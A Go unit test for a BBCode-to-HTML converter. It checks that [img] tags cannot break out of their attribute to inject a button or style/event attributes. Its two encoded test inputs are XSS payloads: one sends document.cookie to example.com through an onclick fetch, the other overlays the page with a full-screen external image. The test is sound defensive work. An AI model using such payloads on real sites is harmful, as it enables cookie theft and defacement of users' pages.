package bbcode

import (
	"strings"
	"testing"

	"golang.org/x/net/html"
)

func TestConvertBBCodeToHTMLImageEscapesDecodedAttributeBreakout(t *testing.T) {
	tests := []struct {
		name  string
		input string
	}{
		{
			name:  "button injection",
			input: `[img]x%27/%3E%3Cbutton%20onclick=%27fetch("https://example.com/cool?c=" %2B document.cookie)%27%3E%3C/button%3E%3Cimg%20src=%27[/img]`,
		},
		{
			name:  "style injection",
			input: `[img]x%27 style=%27position:fixed;top:0;left:0;right:0;bottom:0;width:100%25;height:100%25;z-index:9999;background:url(https://example.com/poc.gif) center/contain no-repeat black;pointer-events:none%27[/img]`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assertSafeImageBBCode(t, tt.input)
		})
	}
}

func assertSafeImageBBCode(t *testing.T, input string) {
	t.Helper()

	output := ConvertBBCodeToHTML(input)
	doc, err := html.Parse(strings.NewReader(output))
	if err != nil {
		t.Fatalf("failed to parse generated HTML: %v", err)
	}

	imageCount := 0
	var walk func(*html.Node)
	walk = func(n *html.Node) {
		if n.Type == html.ElementNode {
			if n.Data == "button" {
				t.Fatalf("image BBCode created an injected button: %s", output)
			}

			if n.Data == "img" {
				imageCount++
				for _, attr := range n.Attr {
					attrName := strings.ToLower(attr.Key)
					if attrName == "style" || strings.HasPrefix(attrName, "on") {
						t.Fatalf("image BBCode created unsafe image attribute %q: %s", attr.Key, output)
					}
				}
			}
		}

		for child := n.FirstChild; child != nil; child = child.NextSibling {
			walk(child)
		}
	}

	walk(doc)

	if imageCount != 1 {
		t.Fatalf("expected one image element, got %d: %s", imageCount, output)
	}
}
